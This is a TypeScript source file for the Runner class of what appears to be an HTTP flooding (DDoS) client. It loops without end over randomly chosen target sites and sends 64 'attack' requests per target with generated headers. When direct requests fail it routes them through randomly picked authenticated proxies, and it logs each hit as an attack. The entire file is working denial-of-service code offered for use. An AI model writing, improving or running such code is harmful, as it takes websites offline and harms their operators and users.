import { EventEmitter } from 'events'
import axios, { AxiosError } from 'axios-https-proxy-fix'
import { TargetData, ProxyData, SiteData } from './types'
import { HttpHeadersUtils } from './utils/httpHeadersUtils'

export class Runner {
  private sites: SiteData[]
  private proxies: ProxyData[]
  private onlyProxy: boolean
  private readonly ATTACKS_PER_TARGET = 64
  private active = false
  public readonly eventSource: EventEmitter
  private requestTimeout: number = 10000

  constructor (props: { sites: SiteData[]; proxies: ProxyData[]; onlyProxy: boolean }) {
    this.sites = props.sites
    this.proxies = props.proxies
    this.onlyProxy = props.onlyProxy
    this.eventSource = new EventEmitter()
  }

  async start () {
    this.active = true
    while (this.active) {
      try {
        await this.sendTroops()
      } catch (error) {
        this.active = false
        throw error
      }
    }
  }

  stop () {
    this.active = false
  }

  setProxyActive(newProxyValue: boolean) {
    this.onlyProxy = newProxyValue
  }

  updateConfiguration (config: { sites: SiteData[]; proxies: ProxyData[]; }) {
    this.sites = config.sites
    this.proxies = config.proxies
  }

  private async sendTroops () {
    const target = {
      site: this.sites[Math.floor(Math.random() * this.sites.length)],
      proxy: this.proxies
    } as TargetData

    // check if direct request can be performed
    let directRequest = false
    if (!this.onlyProxy) {
      try {
        const response = await axios.get(target.site.page, {
          timeout: this.requestTimeout,
          headers: HttpHeadersUtils.generateRequestHeaders()
        })
        directRequest = response.status === 200
      } catch (e) {
        console.debug("DIRECT probing err ", (e as Error).message)
        this.eventSource.emit('error', { error: e })
        directRequest = false
      }
    }

    let proxy = null
    for (let attackIndex = 0; (attackIndex < this.ATTACKS_PER_TARGET); attackIndex++) {
      if (!this.active) {
        break
      }
      try {
        if (directRequest) {
          if(this.onlyProxy) {
            console.log("Changing to only proxy")
            break
          }
          const r = await axios.get(target.site.page, {
            timeout: this.requestTimeout,
            headers: HttpHeadersUtils.generateRequestHeaders(),
            validateStatus: () => true
          })
          this.eventSource.emit('attack', { url: target.site.page, log: `${target.site.page} | DIRECT | ${r.status}` })
        } else {
          if (proxy === null) {
            proxy = target.proxy[Math.floor(Math.random() * target.proxy.length)]
          }
          let proxyObj: any = {}
          const proxyAddressSplit = proxy.ip.split(':')
          const proxyIP = proxyAddressSplit[0]
          const proxyPort = parseInt(proxyAddressSplit[1])
          proxyObj.host = proxyIP
          proxyObj.port = proxyPort

          if(proxy.auth) {
            const proxyAuthSplit = proxy.auth.split(':')
            const proxyUsername = proxyAuthSplit[0]
            const proxyPassword = proxyAuthSplit[1]
            proxyObj.auth = { username: proxyUsername, password: proxyPassword }

          }


          const r = await axios.get(target.site.page, {
            timeout: this.requestTimeout,
            headers: HttpHeadersUtils.generateRequestHeaders(),
            validateStatus: () => true,
            proxy: proxyObj
          })

          this.eventSource.emit('attack', { url: target.site.page, log: `${target.site.page} | PROXY | ${r.status}` })

          if (r.status === 407) {
            console.log(proxy)
            proxy = null
          }
        }
      } catch (e) {
        proxy = null
        const code = (e as AxiosError).code || 'UNKNOWN'
        if (code === 'UNKNOWN') {
          console.error(e)
        }

        this.eventSource.emit('attack', { type: 'atack', url: target.site.page, log: `${target.site.page} | ${code}` })
        if (code === 'ECONNABORTED') {
          break
        }
      }
    }
  }
}
